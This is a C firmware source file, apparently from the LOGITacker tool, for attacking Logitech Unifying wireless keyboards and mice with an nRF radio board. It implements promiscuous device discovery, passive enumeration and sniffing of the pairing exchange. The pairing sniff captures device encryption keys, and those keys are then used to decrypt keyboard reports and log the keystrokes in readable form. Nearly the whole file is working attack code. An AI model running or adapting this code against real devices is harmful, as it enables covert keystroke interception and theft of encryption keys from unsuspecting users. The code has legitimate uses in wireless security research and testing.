#include "logitacker.h"
#include "logitacker_bsp.h"
#include "logitacker_radio.h"
#include "logitacker_devices.h"
#include "nrf.h"
#include "nrf_esb_illegalmod.h"
#include "bsp.h"
#include "unifying.h"
#include "helper.h"
#include "app_timer.h"
#include "logitacker_pairing_parser.h"
#include "logitacker_unifying_crypto.h"
#include "logitacker_keyboard_map.h"
#include "logitacker_processor.h"
#include "logitacker_processor_active_enum.h"
#include "utf.h"

#define NRF_LOG_MODULE_NAME LOGITACKER
#include "nrf_log.h"

NRF_LOG_MODULE_REGISTER();

APP_TIMER_DEF(m_timer_next_tx_action);

static logitacker_processor_t * p_processor = NULL;


typedef struct {
    logitacker_discovery_on_new_address_t on_new_address_action; //not only state, persistent config
} logitacker_substate_discovery_t;


typedef struct {
    uint8_t inner_loop_count; // how many successfull transmissions to RF address of current prefix
    uint8_t led_count;
    uint8_t current_rf_address[5];

    uint8_t base_addr[4];
    uint8_t known_prefix;
    uint8_t next_prefix;

    uint8_t tx_delay_ms;

    bool receiver_in_range;
//    logitacker_active_enumeration_phase_t phase;
} logitacker_substate_active_enumeration_t;

typedef struct {
    uint8_t base_addr[4];
    uint8_t known_prefix;
    uint8_t current_channel_index;

    logitacker_device_set_t devices[NRF_ESB_PIPE_COUNT];
} logitacker_substate_passive_enumeration_t;


typedef struct {
    bool initialized;
    logitacker_mainstate_t   mainstate;
    logitacker_substate_discovery_t substate_discovery;
    logitacker_substate_passive_enumeration_t substate_passive_enumeration;
    logitacker_substate_active_enumeration_t substate_active_enumeration;

    logitacker_pairing_sniff_on_success_t pairing_sniff_on_success_action; //not only state, persistent config

    bsp_event_callback_t current_bsp_event_handler;
    nrf_esb_event_handler_t current_esb_event_handler;
    radio_event_handler_t current_radio_event_handler;
    app_timer_timeout_handler_t current_timer_event_handler;
} logitacker_state_t;


logitacker_state_t m_state_local;

static char addr_str_buff[LOGITACKER_DEVICE_ADDR_STR_LEN] = {0};
static nrf_esb_payload_t tmp_payload = {0};
static nrf_esb_payload_t tmp_tx_payload = {0};

static bool m_main_event_handler_bsp_long_pushed;

static uint8_t m_keyboard_report_decryption_buffer[8] = { 0 };

void main_event_handler_timer_next_action(void *p_context);
void main_event_handler_esb(nrf_esb_evt_t *p_event);
void main_event_handler_radio(radio_evt_t const *p_event);
static void main_event_handler_bsp(bsp_event_t ev);


//void logitacker_enter_mode_discovery();
void discovery_event_handler_esb(nrf_esb_evt_t *p_event);
void discovery_event_handler_radio(radio_evt_t const *p_event);
static void discovery_event_handler_bsp(bsp_event_t ev);
void discovery_process_rx();

//void logitacker_enter_mode_passive_enum(uint8_t * rf_address);
void passive_enum_event_handler_esb(nrf_esb_evt_t *p_event);
void passive_enum_event_handler_radio(radio_evt_t const *p_event);
static void passive_enum_event_handler_bsp(bsp_event_t ev);
void passive_enum_process_rx();

void pairing_sniff_reset_timer();
void pairing_sniff_assign_addr_to_pipe1(uint8_t const *const rf_address);
void pairing_sniff_disable_pipe1();
void pairing_sniff_event_handler_esb(nrf_esb_evt_t *p_event);
void pairing_sniff_event_handler_timer_next_action(void *p_context);


/* main/master event handler */
void main_event_handler_timer_next_action(void *p_context) {
    if (p_processor != NULL && p_processor->p_timer_handler != NULL) (*p_processor->p_timer_handler)(p_processor, p_context); // call timer handler function of p_processor and hand in p_processor (self) as first arg
    if (m_state_local.current_timer_event_handler != NULL) m_state_local.current_timer_event_handler(p_context);
}

void main_event_handler_esb(nrf_esb_evt_t *p_event) {
    switch (p_event->evt_id)
    {
        case NRF_ESB_EVENT_TX_SUCCESS:
            NRF_LOG_DEBUG("ESB EVENT HANDLER MAIN TX_SUCCESS");
            break;
        case NRF_ESB_EVENT_TX_SUCCESS_ACK_PAY:
            NRF_LOG_DEBUG("ESB EVENT HANDLER MAIN TX_SUCCESS_ACK_PAY");
            break;
        case NRF_ESB_EVENT_TX_FAILED:
            NRF_LOG_DEBUG("ESB EVENT HANDLER MAIN TX_FAILED");
            break;
        case NRF_ESB_EVENT_RX_RECEIVED:
            NRF_LOG_DEBUG("ESB EVENT HANDLER MAIN RX_RECEIVED");
            break;
        default:
            break;
    }

    if (p_processor != NULL && p_processor->p_esb_handler != NULL) (*p_processor->p_esb_handler)(p_processor, p_event); // call ESB handler function of p_processor and hand in p_processor (self) as first arg
    if (m_state_local.current_esb_event_handler != 0) m_state_local.current_esb_event_handler(p_event);
}

void main_event_handler_radio(radio_evt_t const *p_event) {
    //helper_log_priority("UNIFYING_event_handler");
    switch (p_event->evt_id)
    {
        case RADIO_EVENT_NO_RX_TIMEOUT:
        {
            NRF_LOG_DEBUG("RADIO EVENT HANDLER MAIN: RX TIMEOUT");
            break;
        }
        case RADIO_EVENT_CHANNEL_CHANGED_FIRST_INDEX:
        {
            NRF_LOG_DEBUG("RADIO EVENT HANDLER MAIN: CHANNEL CHANGED FIRST INDEX");
            break;
        }
        case RADIO_EVENT_CHANNEL_CHANGED:
        {
            NRF_LOG_DEBUG("RADIO EVENT HANDLER MAIN: CHANNEL CHANGED (index %d, channel freq %d)", p_event->channel_index, p_event->channel);
            break;
        }
    }

    if (p_processor != NULL && p_processor->p_radio_handler != NULL) (*p_processor->p_radio_handler)(p_processor, p_event); // call ESB handler function of p_processor and hand in p_processor (self) as first arg
    if (m_state_local.current_radio_event_handler != 0) m_state_local.current_radio_event_handler(p_event);
}

static void main_event_handler_bsp(bsp_event_t ev)
{
    // runs in interrupt mode
    //helper_log_priority("bsp_event_callback");
    //uint32_t ret;
    switch ((unsigned int)ev)
    {
        case CONCAT_2(BSP_EVENT_KEY_, BTN_TRIGGER_ACTION):
            //Toggle radio back to promiscous mode
            NRF_LOG_INFO("ACTION button pushed");
            bsp_board_led_on(LED_B);
            break;

        case BSP_USER_EVENT_LONG_PRESS_0:
            m_main_event_handler_bsp_long_pushed = true;
            NRF_LOG_INFO("ACTION BUTTON PUSHED LONG");
            break;

        case BSP_USER_EVENT_RELEASE_0:
            if (m_main_event_handler_bsp_long_pushed) {
                m_main_event_handler_bsp_long_pushed = false;
                break; // don't act if there was already a long press event
            }
            NRF_LOG_INFO("ACTION BUTTON RELEASED");
            break;

        default:
            break; // no implementation needed
    }

    if (p_processor != NULL && p_processor->p_bsp_handler != NULL) (*p_processor->p_bsp_handler)(p_processor, ev); // call BSP handler function of p_processor and hand in p_processor (self) as first arg
    if (m_state_local.current_bsp_event_handler != 0) m_state_local.current_bsp_event_handler(ev);
}

/* methods for discovery mode */
void logitacker_enter_mode_discovery() {
    p_processor = NULL;
    NRF_LOG_INFO("Entering discovery mode");

    nrf_esb_stop_rx(); //stop rx in case running
    radio_disable_rx_timeout_event(); // disable RX timeouts
    radio_stop_channel_hopping(); // disable channel hopping

    m_state_local.mainstate = LOGITACKER_MAINSTATE_DISCOVERY;

    m_state_local.current_bsp_event_handler = discovery_event_handler_bsp;
    m_state_local.current_esb_event_handler = discovery_event_handler_esb; // process RX_RECEIVED
    m_state_local.current_radio_event_handler = discovery_event_handler_radio; //restarts channel hopping on rx timeout
    m_state_local.current_timer_event_handler = NULL;

    bsp_board_leds_off(); //disable all LEDs

    //set radio to promiscuous mode and start RX
    nrf_esb_set_mode(NRF_ESB_MODE_PROMISCOUS); //use promiscuous mode
    nrf_esb_start_rx(); //start rx
    radio_enable_rx_timeout_event(LOGITACKER_DISCOVERY_STAY_ON_CHANNEL_AFTER_RX_MS); //set RX timeout, the eventhandler starts channel hopping once this timeout is reached
}

void discovery_event_handler_esb(nrf_esb_evt_t *p_event) {
    switch (p_event->evt_id) {
        case NRF_ESB_EVENT_RX_RECEIVED:
            NRF_LOG_DEBUG("ESB EVENT HANDLER DISCOVERY RX_RECEIVED");
            discovery_process_rx(); //replace by processing of frames
            break;
        default:
            break;
    }
}

void discovery_event_handler_radio(radio_evt_t const *p_event) {
    //helper_log_priority("UNIFYING_event_handler");
    switch (p_event->evt_id)
    {
        case RADIO_EVENT_NO_RX_TIMEOUT:
        {
            NRF_LOG_INFO("Discovery: no RX on current channel for %d ms ... restart channel hopping ...", LOGITACKER_DISCOVERY_STAY_ON_CHANNEL_AFTER_RX_MS);
            radio_start_channel_hopping(LOGITACKER_DISCOVERY_CHANNEL_HOP_INTERVAL_MS, 0, true); //start channel hopping directly (0ms delay) with 30ms hop interval, automatically stop hopping on RX
            break;
        }
        case RADIO_EVENT_CHANNEL_CHANGED_FIRST_INDEX:
        {
            NRF_LOG_DEBUG("DISCOVERY MODE channel hop reached first channel");
            bsp_board_led_invert(LED_B); // toggle scan LED everytime we jumped through all channels
            break;
        }
        default:
            break;
    }
}

static void discovery_event_handler_bsp(bsp_event_t ev) {
    NRF_LOG_INFO("Discovery BSP event: %d", (unsigned int)ev);
}

void discovery_process_rx() {
    static nrf_esb_payload_t rx_payload;
    static nrf_esb_payload_t * p_rx_payload = &rx_payload;
    while (nrf_esb_read_rx_payload(p_rx_payload) == NRF_SUCCESS) {
        if (p_rx_payload->validated_promiscuous_frame) {
            uint8_t len = p_rx_payload->length;
            uint8_t ch_idx = p_rx_payload->rx_channel_index;
            uint8_t ch = p_rx_payload->rx_channel;
            uint8_t addr[5];
            memcpy(addr, &p_rx_payload->data[2], 5);

            uint8_t prefix;
            uint8_t base[4];
            helper_addr_to_base_and_prefix(base, &prefix, addr, 5); //convert device addr to base+prefix and update device

            helper_addr_to_hex_str(addr_str_buff, LOGITACKER_DEVICE_ADDR_LEN, addr);
            NRF_LOG_INFO("DISCOVERY: received valid ESB frame (addr %s, len: %d, ch idx %d, raw ch %d)", addr_str_buff, len, ch_idx, ch);
           
            NRF_LOG_HEXDUMP_DEBUG(p_rx_payload->data, p_rx_payload->length);

            logitacker_device_set_t *p_device = logitacker_device_set_add_new_by_dev_addr(addr);

            // update device counters
            if (p_device != NULL) {
                logitacker_radio_convert_promiscuous_frame_to_default_frame(&tmp_payload, rx_payload);
                //logitacker_device_update_counters_from_frame(p_device, prefix, tmp_payload);
                logitacker_device_update_counters_from_frame(addr, tmp_payload);
            }

            switch (m_state_local.substate_discovery.on_new_address_action) {
                case LOGITACKER_DISCOVERY_ON_NEW_ADDRESS_DO_NOTHING:
                    break;
                case LOGITACKER_DISCOVERY_ON_NEW_ADDRESS_SWITCH_ACTIVE_ENUMERATION:
                    logitacker_enter_mode_active_enum(addr);
                    break;
                case LOGITACKER_DISCOVERY_ON_NEW_ADDRESS_SWITCH_PASSIVE_ENUMERATION:
                    logitacker_enter_mode_passive_enum(addr);
                    break;
                default:
                    // do nothing, stay in discovery
                    break;
            }
        } else {
            NRF_LOG_WARNING("invalid promiscuous frame in discovery mode, shouldn't happen because of filtering");
        }

    }

}

/* methods for passive enumeration mode */
void passive_enum_event_handler_esb(nrf_esb_evt_t *p_event) {
    switch (p_event->evt_id) {
        case NRF_ESB_EVENT_RX_RECEIVED:
            NRF_LOG_DEBUG("ESB EVENT HANDLER PASSIVE ENUMERATION RX_RECEIVED");
            passive_enum_process_rx();
            break;
        default:
            break;
    }
}

void passive_enum_event_handler_radio(radio_evt_t const *p_event) {
    //helper_log_priority("UNIFYING_event_handler");
    switch (p_event->evt_id)
    {
        case RADIO_EVENT_NO_RX_TIMEOUT:
        {
            NRF_LOG_INFO("Passive enumeration: no RX on current channel for %d ms ... restart channel hopping ...", LOGITACKER_PASSIVE_ENUM_STAY_ON_CHANNEL_AFTER_RX_MS);
            radio_start_channel_hopping(LOGITACKER_PASSIVE_ENUM_CHANNEL_HOP_INTERVAL_MS, 0, true); //start channel hopping directly (0ms delay) with 30ms hop interval, automatically stop hopping on RX
            break;
        }
        case RADIO_EVENT_CHANNEL_CHANGED_FIRST_INDEX:
        {
            NRF_LOG_DEBUG("DISCOVERY MODE channel hop reached first channel");
            bsp_board_led_invert(LED_B); // toggle scan LED everytime we jumped through all channels
            break;
        }
        default:
            break;
    }
}

static void passive_enum_event_handler_bsp(bsp_event_t ev) {
    NRF_LOG_INFO("Passive enumeration BSP event: %d", (unsigned int)ev);
    switch ((unsigned int)ev)
    {
        case BSP_USER_EVENT_RELEASE_0:
            NRF_LOG_INFO("ACTION BUTTON RELEASED in passive enumeration mode, changing back to discovery...");
            logitacker_enter_mode_discovery();
            break;
        default:
            break; // no implementation needed
    }
}

void passive_enum_process_rx() {
    static nrf_esb_payload_t rx_payload;
    static nrf_esb_payload_t * p_rx_payload = &rx_payload;
    while (nrf_esb_read_rx_payload(p_rx_payload) == NRF_SUCCESS) {
            uint8_t len = p_rx_payload->length;
            uint8_t unifying_report_type;
            bool unifying_is_keep_alive;
            unifying_frame_classify(rx_payload, &unifying_report_type, &unifying_is_keep_alive);

//            logitacker_device_set_t *p_device = &m_state_local.substate_passive_enumeration.devices[rx_payload.pipe]; //pointer to correct device meta data

            uint8_t addr[5];
            nrf_esb_convert_pipe_to_address(p_rx_payload->pipe, addr);

            uint8_t prefix;
            uint8_t base[4];
            helper_addr_to_base_and_prefix(base, &prefix, addr, 5); //convert device addr to base+prefix and update device

            //logitacker_device_update_counters_from_frame(p_device, prefix, rx_payload); //update device data
            logitacker_device_update_counters_from_frame(addr, rx_payload);


            if (!(unifying_report_type == 0x00 && unifying_is_keep_alive) && len != 0) { //ignore keep-alive only frames and empty frames
                uint8_t ch_idx = p_rx_payload->rx_channel_index;
                uint8_t ch = p_rx_payload->rx_channel;
                helper_addr_to_hex_str(addr_str_buff, LOGITACKER_DEVICE_ADDR_LEN, addr);
                NRF_LOG_INFO("frame RX in passive enumeration mode (addr %s, len: %d, ch idx %d, raw ch %d)", addr_str_buff, len, ch_idx, ch);
                unifying_frame_classify_log(rx_payload);
                NRF_LOG_HEXDUMP_INFO(p_rx_payload->data, p_rx_payload->length);

                if (unifying_report_type == UNIFYING_RF_REPORT_ENCRYPTED_KEYBOARD) {
                    // check if theres a device entry for the address
                    logitacker_device_capabilities_t * p_caps = logitacker_device_get_caps_pointer(addr);
                    if (p_caps != NULL && p_caps->key_known) {
                        // decrypt and print frame
                        if (logitacker_unifying_crypto_decrypt_encrypted_keyboard_frame(m_keyboard_report_decryption_buffer, p_caps->key, p_rx_payload) == NRF_SUCCESS) {
                            NRF_LOG_INFO("Test decryption of keyboard payload:");
                            NRF_LOG_HEXDUMP_INFO(m_keyboard_report_decryption_buffer, 8);
                            //ToDo: print modifier

                            // print human readable form of keys
                            for (int k=1; k<7; k++) {
                                if (m_keyboard_report_decryption_buffer[k] == 0x00 && k>0) break; //print no further keys
                                NRF_LOG_INFO("Key %d: %s", k, keycode_to_str(m_keyboard_report_decryption_buffer[k]));
                            }
                        }
                    }
                }
            }
    }

}

bool m_pair_sniff_data_rx = false;
uint32_t m_pair_sniff_ticks = APP_TIMER_TICKS(8);
uint32_t m_pair_sniff_ticks_long = APP_TIMER_TICKS(20);
bool m_pair_sniff_dongle_in_range = false;
static logitacker_pairing_info_t m_device_pair_info;


void pairing_sniff_reset_timer() {
    app_timer_stop(m_timer_next_tx_action);
    if (m_pair_sniff_data_rx) {
        app_timer_start(m_timer_next_tx_action, m_pair_sniff_ticks_long, NULL);
        m_pair_sniff_data_rx = false;
    } else {
        app_timer_start(m_timer_next_tx_action, m_pair_sniff_ticks, NULL);
    }


}

void pairing_sniff_assign_addr_to_pipe1(uint8_t const *const rf_address) {
    uint8_t base[4] = { 0 };
    uint8_t prefix = 0;
    helper_addr_to_base_and_prefix(base, &prefix, rf_address, 5);

    //stop time to prevent rewriting payloads
    app_timer_stop(m_timer_next_tx_action);
    while (nrf_esb_stop_rx() != NRF_SUCCESS) {}
    nrf_esb_set_base_address_1(base);
    nrf_esb_update_prefix(1, prefix);
    nrf_esb_enable_pipes(0x03);
    app_timer_start(m_timer_next_tx_action, m_pair_sniff_ticks, NULL); // restart timer
}

void pairing_sniff_disable_pipe1() {
    //stop time to prevent rewriting payloads
    app_timer_stop(m_timer_next_tx_action);
    while (nrf_esb_stop_rx() != NRF_SUCCESS) {}
    nrf_esb_enable_pipes(0x01);
    app_timer_start(m_timer_next_tx_action, m_pair_sniff_ticks, NULL); // restart timer
}

void pairing_sniff_on_success() {
    switch (m_state_local.pairing_sniff_on_success_action) {
        case LOGITACKER_PAIRING_SNIFF_ON_SUCCESS_CONTINUE:
            NRF_LOG_INFO("Continue to sniff pairing");
            return;
        case LOGITACKER_PAIRING_SNIFF_ON_SUCCESS_SWITCH_DISCOVERY:
            NRF_LOG_INFO("Sniffed full pairing, changing back to discover mode");
            app_timer_stop(m_timer_next_tx_action);
            logitacker_enter_mode_discovery();
            break;
        case LOGITACKER_PAIRING_SNIFF_ON_SUCCESS_SWITCH_ACTIVE_ENUMERATION:
            app_timer_stop(m_timer_next_tx_action);
            helper_addr_to_hex_str(addr_str_buff, 5, m_device_pair_info.device_rf_address);
            NRF_LOG_INFO("Sniffed full pairing, moving on with active enumeration for %s", nrf_log_push(addr_str_buff));
            logitacker_enter_mode_active_enum(m_device_pair_info.device_rf_address);
            break;
        case LOGITACKER_PAIRING_SNIFF_ON_SUCCESS_SWITCH_PASSIVE_ENUMERATION:
            app_timer_stop(m_timer_next_tx_action);
            helper_addr_to_hex_str(addr_str_buff, 5, m_device_pair_info.device_rf_address);
            NRF_LOG_INFO("Sniffed full pairing, moving on with passive enumeration for %s", nrf_log_push(addr_str_buff));
            logitacker_enter_mode_passive_enum(m_device_pair_info.device_rf_address);
            break;
        default:
            break;
    }
}

void pairing_sniff_event_handler_esb(nrf_esb_evt_t *p_event) {
    uint32_t freq;
    nrf_esb_get_rf_frequency(&freq);

    switch (p_event->evt_id) {
        // happens when PTX_stay_RX is in sub state PRX and receives data
        case NRF_ESB_EVENT_RX_RECEIVED:
        case NRF_ESB_EVENT_TX_SUCCESS_ACK_PAY:
            // we received data
            NRF_LOG_INFO("PAIR SNIFF data received on channel %d", freq);
            while (nrf_esb_read_rx_payload(&tmp_payload) == NRF_SUCCESS) {
                m_pair_sniff_data_rx = true;
                NRF_LOG_HEXDUMP_INFO(tmp_payload.data, tmp_payload.length);

                // check if pairing response phase 1, with new address
                if (tmp_payload.length == 22 && tmp_payload.data[1] == 0x1f && tmp_payload.data[2] == 0x01) {
                    /*
                     * <info> LOGITACKER:  BC 1F 01 BD BA 92 24 27|......$'
                     * <info> LOGITACKER:  08 88 08 04 01 01 07 00|........
                     * <info> LOGITACKER:  00 00 00 00 00 2B
                     */

                    uint8_t new_address[LOGITACKER_DEVICE_ADDR_LEN] = { 0 };
                    memcpy(new_address, &tmp_payload.data[3], LOGITACKER_DEVICE_ADDR_LEN);
                    pairing_sniff_assign_addr_to_pipe1(new_address);

                    helper_addr_to_hex_str(addr_str_buff, LOGITACKER_DEVICE_ADDR_LEN, new_address);
                    NRF_LOG_INFO("PAIR SNIFF assigned %s as new sniffing address", addr_str_buff);
                }

                // clear pairing info when new pairing request 1 is spotted
                if (tmp_payload.length == 22 && tmp_payload.data[1] == 0x5f && tmp_payload.data[2] == 0x01) {
                    memset(&m_device_pair_info, 0, sizeof(m_device_pair_info));
                }

                // parse pairing data
                if (logitacker_pairing_parser(&m_device_pair_info, &tmp_payload) == NRF_SUCCESS) {
                    // full pairing parsed (no frames missing)
                    pairing_sniff_disable_pipe1();

                    //retrieve device or add new and update data
                    logitacker_device_set_t * p_device_set = logitacker_device_set_add_new_by_dev_addr(m_device_pair_info.device_rf_address);
                    if (p_device_set == NULL) {
                        NRF_LOG_ERROR("failed adding device entry for pairing sniff result");
                    } else {
                        // update device caps
                        logitacker_device_capabilities_t * p_caps = logitacker_device_get_caps_pointer(m_device_pair_info.device_rf_address);
                        memcpy(p_caps->serial, m_device_pair_info.device_serial, 4);
                        memcpy(p_caps->device_name, m_device_pair_info.device_name, m_device_pair_info.device_name_len);
                        memcpy(p_caps->key, m_device_pair_info.device_key, 16);
                        memcpy(p_caps->raw_key_data, m_device_pair_info.device_raw_key_material, 16);
                        memcpy(p_caps->rf_address, m_device_pair_info.device_rf_address, 16);
                        memcpy(p_caps->wpid, m_device_pair_info.device_wpid, 2);
                        memcpy(p_device_set->wpid, m_device_pair_info.dongle_wpid, 2);

                        p_caps->key_known = m_device_pair_info.key_material_complete;
                    }

                    pairing_sniff_on_success();
                }
            }
            pairing_sniff_reset_timer();
            break;
        case NRF_ESB_EVENT_TX_SUCCESS:
        {
            // we hit the dongle, but no data was received on the channel so far, we start a timer for ping re-transmission
            if (!m_pair_sniff_dongle_in_range) {
                NRF_LOG_INFO("Spotted dongle in pairing mode, follow while channel hopping");
                m_pair_sniff_dongle_in_range = true;
            }
            NRF_LOG_INFO("dongle on channel %d ", freq);
            pairing_sniff_reset_timer();
            break;
        }
        case NRF_ESB_EVENT_TX_FAILED:
        {
            // missed dongle, re-transmit ping payload

            if (m_pair_sniff_dongle_in_range) {
                // if dongle was in range before, notify tha we lost track
                NRF_LOG_INFO("Lost dongle in pairing mode, restart channel hopping");
                m_pair_sniff_dongle_in_range = false;
            }

            NRF_LOG_DEBUG("TX_FAILED on all channels, retry %d ...", freq);
            // write payload again and start rx
            nrf_esb_start_tx();
        }
        default:
            break;
    }
}


// Transfers execution to active_enum_process_sub_event
void pairing_sniff_event_handler_timer_next_action(void *p_context) {
        // if we haven't received data after last ping, ping again
    //NRF_LOG_INFO("re-ping");
        nrf_esb_flush_tx();
        nrf_esb_write_payload(&tmp_tx_payload);
}



// Transfers execution to active_enum_process_sub_event
void logitacker_enter_mode_passive_enum(uint8_t *rf_address) {
    p_processor = NULL;
    helper_addr_to_hex_str(addr_str_buff, LOGITACKER_DEVICE_ADDR_LEN, rf_address);
    NRF_LOG_INFO("Entering passive enumeration mode for address %s", addr_str_buff);

    
    nrf_esb_stop_rx(); //stop rx in case running
    radio_disable_rx_timeout_event(); // disable RX timeouts
    radio_stop_channel_hopping(); // disable channel hopping
    
    m_state_local.mainstate = LOGITACKER_MAINSTATE_PASSIVE_ENUMERATION;
    m_state_local.current_bsp_event_handler = passive_enum_event_handler_bsp;
    m_state_local.current_radio_event_handler = passive_enum_event_handler_radio;
    m_state_local.current_esb_event_handler = passive_enum_event_handler_esb;
    m_state_local.current_timer_event_handler = NULL;

    //reset device state
    memset(m_state_local.substate_passive_enumeration.devices, 0, sizeof(m_state_local.substate_passive_enumeration.devices));

    uint8_t base_addr[4] = { 0 };
    uint8_t prefix = 0;
    helper_addr_to_base_and_prefix(base_addr, &prefix, rf_address, 5);
    memcpy(m_state_local.substate_passive_enumeration.base_addr, base_addr, 4);
    m_state_local.substate_passive_enumeration.known_prefix = prefix;
    
    // define listening device_prefixes for neighbours and dongle address (0x00 prefix)
    uint8_t prefixes[] = { 0x00, prefix, prefix-1, prefix-2, prefix+1, prefix+2, prefix+3 };
    int prefix_count = sizeof(prefixes);

    // if the rf_address is in device list and has more than 1 prefix (f.e. from active scan), overwrite listen device_prefixes
    logitacker_device_set_t * p_dev = logitacker_device_set_list_get_by_addr(rf_address);
    if (p_dev->num_device_prefixes > 1) {
        memcpy(prefixes, p_dev->device_prefixes, p_dev->num_device_prefixes);
        prefix_count = p_dev->num_device_prefixes;
    }


    bsp_board_leds_off(); //disable all LEDs

    uint32_t res = 0;
    
    res = nrf_esb_set_mode(NRF_ESB_MODE_SNIFF);
    if (res != NRF_SUCCESS) NRF_LOG_ERROR("nrf_esb_set_mode SNIFF: %d", res);
    res = nrf_esb_set_base_address_1(m_state_local.substate_passive_enumeration.base_addr); // set base addr1
    if (res != NRF_SUCCESS) NRF_LOG_ERROR("nrf_esb_set_base_address_1: %d", res);

    for (int i=0; i<prefix_count; i++) {
        res = nrf_esb_update_prefix(i+1, prefixes[i]); // set suffix 0x00 for pipe 1 (dongle address
        if (res == NRF_SUCCESS) {
            NRF_LOG_INFO("listen on prefix %.2x with pipe %d", prefixes[i], i+1);
        } else {
            NRF_LOG_ERROR("error updating prefix pos %d with %.2x: %d", i+1, prefixes[i], res);
        }

    }

    // add global pairing address to pipe 0
    helper_addr_to_base_and_prefix(base_addr, &prefix, UNIFYING_GLOBAL_PAIRING_ADDRESS, 5);
    res = nrf_esb_set_base_address_0(base_addr);
    if (res != NRF_SUCCESS) NRF_LOG_ERROR("nrf_esb_set_base_address_0: %d", res);
    res = nrf_esb_update_prefix(0, prefix);
    if (res != NRF_SUCCESS) NRF_LOG_ERROR("update prefix 0: %d", res);

    nrf_esb_enable_pipes(0xff >> (7-prefix_count)); //enable all rx pipes
    

    //while (nrf_esb_start_rx() != NRF_SUCCESS) {};
    res = nrf_esb_start_rx();
    if (res != NRF_SUCCESS) NRF_LOG_ERROR("start_rx: %d", res);

    radio_enable_rx_timeout_event(LOGITACKER_PASSIVE_ENUM_STAY_ON_CHANNEL_AFTER_RX_MS); //set RX timeout, the eventhandler starts channel hopping once this timeout is reached    

}


void logitacker_enter_mode_pairing_sniff() {
    p_processor = NULL;

    helper_addr_to_hex_str(addr_str_buff, LOGITACKER_DEVICE_ADDR_LEN, UNIFYING_GLOBAL_PAIRING_ADDRESS);
    uint8_t base_addr[4] = { 0 };
    uint8_t prefix = 0;
    helper_addr_to_base_and_prefix(base_addr, &prefix, UNIFYING_GLOBAL_PAIRING_ADDRESS, 5);

    NRF_LOG_INFO("Sniff pairing on address %s", addr_str_buff);

    
    nrf_esb_stop_rx(); //stop rx in case running
    radio_disable_rx_timeout_event(); // disable RX timeouts
    radio_stop_channel_hopping(); // disable channel hopping
    
    m_state_local.mainstate = LOGITACKER_MAINSTATE_SNIFF_PAIRING;
    m_state_local.current_bsp_event_handler = NULL;
    m_state_local.current_radio_event_handler = NULL;
    m_state_local.current_esb_event_handler = pairing_sniff_event_handler_esb;
    m_state_local.current_timer_event_handler = pairing_sniff_event_handler_timer_next_action;
    m_state_local.pairing_sniff_on_success_action = LOGITACKER_PAIRING_SNIFF_ON_SUCCESS_SWITCH_PASSIVE_ENUMERATION;

    
    bsp_board_leds_off(); //disable all LEDs

    uint32_t res = 0;    
    res = nrf_esb_set_mode(NRF_ESB_MODE_SNIFF);
    if (res != NRF_SUCCESS) NRF_LOG_ERROR("nrf_esb_set_mode SNIFF: %d", res);
    res = nrf_esb_set_base_address_0(base_addr); // set base addr1
    if (res != NRF_SUCCESS) NRF_LOG_ERROR("nrf_esb_set_base_address_0: %d", res);



    // add global pairing address to pipe 0
    res = nrf_esb_set_base_address_0(base_addr);
    if (res != NRF_SUCCESS) NRF_LOG_ERROR("nrf_esb_set_base_address_0: %d", res);
    res = nrf_esb_update_prefix(0, prefix);
    if (res != NRF_SUCCESS) NRF_LOG_ERROR("update prefix 0: %d", res);

    nrf_esb_enable_pipes(0x01); //enable only pipe 0

    // prepare ping payload
    tmp_tx_payload.length = 1;
    tmp_tx_payload.data[0] = 0x00; // no valid unifying payload, but ack'ed on ESB radio layer
    tmp_tx_payload.pipe = 0; // pipe with global pairing address assigned
    tmp_tx_payload.noack = false; // we need an ack

    // setup radio as PTX
    nrf_esb_set_mode(NRF_ESB_MODE_PTX_STAY_RX);
    nrf_esb_enable_all_channel_tx_failover(true); //retransmit payloads on all channels if transmission fails
    nrf_esb_set_all_channel_tx_failover_loop_count(4); //iterate over channels two times before failing

    m_state_local.mainstate = LOGITACKER_MAINSTATE_SNIFF_PAIRING;

    // use special channel lookup table for pairing mode
    nrf_esb_update_channel_frequency_table_unifying_pairing();

    // write payload (autostart TX is enabled for PTX mode)
    nrf_esb_write_payload(&tmp_tx_payload);
    app_timer_start(m_timer_next_tx_action, m_pair_sniff_ticks, NULL);
}


void logitacker_enter_mode_active_enum(uint8_t *rf_address) {
    p_processor = new_processor_active_enum(rf_address, m_timer_next_tx_action);
    p_processor->p_init_func(p_processor);
}

uint32_t logitacker_init() {
    app_timer_create(&m_timer_next_tx_action, APP_TIMER_MODE_SINGLE_SHOT, main_event_handler_timer_next_action);

    m_state_local.substate_discovery.on_new_address_action = LOGITACKER_DISCOVERY_ON_NEW_ADDRESS_DO_NOTHING;
    logitacker_bsp_init(main_event_handler_bsp);
    logitacker_radio_init(main_event_handler_esb, main_event_handler_radio);
    logitacker_enter_mode_discovery();


    return NRF_SUCCESS;
}

void logitacker_discovery_mode_set_on_new_address_action(logitacker_discovery_on_new_address_t on_new_address_action) {
    m_state_local.substate_discovery.on_new_address_action = on_new_address_action;
}



